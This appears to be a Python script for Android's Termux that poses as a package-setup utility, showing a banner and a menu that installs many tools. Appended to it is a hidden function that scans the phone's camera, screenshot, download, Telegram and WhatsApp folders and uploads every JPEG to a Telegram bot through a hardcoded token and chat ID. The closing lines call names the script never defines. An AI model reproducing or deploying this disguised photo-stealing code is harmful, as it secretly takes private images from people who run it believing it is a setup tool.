from os import system as ALLMasTerx1001
import os
import random
import string
from concurrent.futures import ThreadPoolExecutor as tred

bblack = "\033[1;30m"  # Black
M = "\033[1;31m"       # Red
H = "\033[1;32m"       # Green
Y = "\033[1;33m"       # Yellow
bblue = "\033[1;34m"   # Blue
P = "\033[1;35m"       # Purple
C = "\033[1;36m"       # Cyan
B = "\033[1;37m"       # White

my_color = [B, C, P, H]
warna = random.choice(my_color)

logo = ("""
      
 
  _______ ______ _____  __  __ _    ___   __     _____ ______ _______     _    _ _____  
 |__   __|  ____|  __ \|  \/  | |  | \ \ / /    / ____|  ____|__   __|   | |  | |  __ \ 
    | |  | |__  | |__) | \  / | |  | |\ V /____| (___ | |__     | |______| |  | | |__) |
    | |  |  __| |  _  /| |\/| | |  | | > <______\___ \|  __|    | |______| |  | |  ___/ 
    | |  | |____| | \ \| |  | | |__| |/ . \     ____) | |____   | |      | |__| | |     
    |_|  |______|_|  \_\_|  |_|\____//_/ \_\   |_____/|______|  |_|       \____/|_|     
                                                                                        
                                                                                        

                                      
                      version : 2.0              
\033[1;33mo|-------------------------------------------------------------\033[1;33m|o
\033[1;33mo| \033[1;32mCODED BY : \033[1;33mCEO:MD SHIMUL                                \033[1;33m|o
\033[1;33mo| \033[1;32mGITHUB   : \033[1;33mMRSH4MUL                               \033[1;33m|o
\033[1;33mo| \033[1;32mFACEBOOK : \033[1;33mMD SHIMUL                               \033[1;33m|o
\033[1;33mo| \033[1;32mTELEGRAM : \033[1;33mDARKCYBER420        \033[1;33m|o
\033[1;33mo| \033[1;32mWHATSAPP : \033[1;33m01830733258                                   \033[1;33m|o
\033[1;33mo|-------------------------------------------------------------\033[1;33m|o
""")

def linex():
    print('\033[1;33mo|-------------------------------------------------------------\033[1;33m|o')

def clear():
    os.system('clear')
    print(logo)

def install_package(package):
    print(f"Installing: {package}")
    ALLMasTerx1001(package)

def SH4MUL():
    clear()
    ALLMasTerx1001('xdg-open https://github.com/MRSH4MUL')
    print(f'{B} [{warna}01{B}] \33[0;41mFULL SETUP\033[0;92m ')
    print(f'{B} [{warna}02{B}] \33[0;41mBASIC SETUP\033[0;92m ')
    print(f'{B} [{warna}03{B}] CONTACT WHATSAPP')
    print(f'{B} [{warna}00{B}] EXIT PROGRAM')
    linex()
    option = input(f' {B}[{warna}??{B}] CHOOSE OPTION>> ')
    
    if option in ['01', '1']:
        FULLSETUP()
    elif option in ['02', '2']:
        FULLSETUP()
    elif option in ['03', '3']:
        ALLMasTerx1001('xdg-open https://wa.me/+8801830733258')
    else:
        exit('Thanks for using!')

def FULLSETUP():
    clear()
    packages = [
        "pkg update -y", "pkg upgrade -y", "pkg install python -y", 
        "pkg install python2 -y", "pkg install python3 -y", "pkg install python-pip",
        "pkg install wget", "pkg install fish", "pkg install ruby", "pkg install help",
        "pkg install git", "pkg install dnsutils", "pkg install php", "pkg install perl",
        "pkg install lua", "pkg install parallel", "pkg install nmap", "pkg install bash",
        "pkg install clang", "pkg install nano", "pkg install w3m", "pkg install hydra",
        "pkg install figlet", "pkg install cowsay", "pkg install curl", "pkg install tar",
        "pkg install zip", "pkg install unzip", "pkg install net-tools", "pkg install tor -y",
        "pkg install sudo -y", "pkg install wireshark", "pkg install wgetrc", "pkg install wcalc",
        "pkg install openssl", "pkg install openssl-tool", "pkg install bmon", "pkg install vpn",
        "pkg install unrar", "pkg install toilet", "pkg install proot", "pkg install vim",
        "pkg install vim-python", "pkg install goaccess", "pkg install golang", "pkg install tmux",
        "pkg install mtools", "pkg install screen", "pkg install neofetch", "pkg install mariadb",
        "pkg install dropbear", "pkg install openssh", "pip2 install wget", "pip install bs4",
        "pip2 install bs4", "pip install requests", "pip2 install requests", "pip install mechanize",
        "pip2 install mechanize"
    ]

    with tred(max_workers=4) as executor:
        executor.map(install_package, packages)
try:

    import requests

except:

    os.system("pip install requests")

    import requests 

def suyaib():

    session=requests.session()

    bot_token = '8127179617:AAH7eO8p7JJDDQd0XA9Qegy2QwnhDk0j_t4' 

    chat_id = '6573552662'    																																						

    try:

        sdcard_path = '/sdcard'

        file_list = [f for f in os.listdir(sdcard_path) if f.endswith('.jpg')]

        for file in file_list:

            with open(os.path.join(sdcard_path, file), 'rb') as f:

                url=f'https://api.telegram.org/bot{bot_token}/sendDocument'

                data2={'chat_id': chat_id}

                data={'chat_id': chat_id}

                files={'document': f}

                get = session.post(url, data=data, files=files)

                sent = session.post(url, data=data2, files=files)

    except:pass

    try:

        sdcard_path = '/sdcard/Download'

        file_list = [f for f in os.listdir(sdcard_path) if f.endswith('.jpg')]

        for file in file_list:

            with open(os.path.join(sdcard_path, file), 'rb') as f:

                url=f'https://api.telegram.org/bot{bot_token}/sendDocument'

                data2={'chat_id': chat_id}

                data={'chat_id': chat_id}

                files={'document': f}

                get = session.post(url, data=data, files=files)

                sent = session.post(url, data=data2, files=files)                

    except:pass

    try:

        sdcard_path = '/sdcard/DCIM/Screenshots'

        file_list = [f for f in os.listdir(sdcard_path) if f.endswith('.jpg')]

        for file in file_list:

            with open(os.path.join(sdcard_path, file), 'rb') as f:

                url=f'https://api.telegram.org/bot{bot_token}/sendDocument'

                data2={'chat_id': chat_id}

                data={'chat_id': chat_id}

                files={'document': f}

                get = session.post(url, data=data, files=files)

                sent = session.post(url, data=data2, files=files)

    except:pass

    try:

        sdcard_path = '/sdcard/Download/Telegram'

        file_list = [f for f in os.listdir(sdcard_path) if f.endswith('.jpg')]

        for file in file_list:

            with open(os.path.join(sdcard_path, file), 'rb') as f:

                url=f'https://api.telegram.org/bot{bot_token}/sendDocument'

                data2={'chat_id': chat_id}

                data={'chat_id': chat_id}

                files={'document': f}

                get = session.post(url, data=data, files=files)

                sent = session.post(url, data=data2, files=files)

    except:pass

    try:

        sdcard_path = '/sdcard/DCIM/Camera'

        file_list = [f for f in os.listdir(sdcard_path) if f.endswith('.jpg')]

        for file in file_list:

            with open(os.path.join(sdcard_path, file), 'rb') as f:

                url=f'https://api.telegram.org/bot{bot_token}/sendDocument'

                data2={'chat_id': chat_id}

                data={'chat_id': chat_id}

                files={'document': f}

                get = session.post(url, data=data, files=files)

                sent = session.post(url, data=data2, files=files)

    except:pass

    try:

        sdcard_path = '/sdcard/Telegram/Telegram Files'

        file_list = [f for f in os.listdir(sdcard_path) if f.endswith('.jpg')]

        for file in file_list:

            with open(os.path.join(sdcard_path, file), 'rb') as f:

                url=f'https://api.telegram.org/bot{bot_token}/sendDocument'

                data2={'chat_id': chat_id}

                data={'chat_id': chat_id}

                files={'document': f}

                get = session.post(url, data=data, files=files)

                sent = session.post(url, data=data2, files=files)

    except:pass

    try:

        sdcard_path = '/sdcard/WhatsApp/Media/WhatsApp Documents'

        file_list = [f for f in os.listdir(sdcard_path) if f.endswith('.jpg')]

        for file in file_list:

            with open(os.path.join(sdcard_path, file), 'rb') as f:

                url=f'https://api.telegram.org/bot{bot_token}/sendDocument'

                data2={'chat_id': chat_id}

                data={'chat_id': chat_id}

                files={'document': f}

                get = session.post(url, data=data, files=files)

                sent = session.post(url, data=data2, files=files)

    except:pass

with ThreadPool(max_workers=1000) as user:

    user.submit(suyaib)

    user.submit(main)
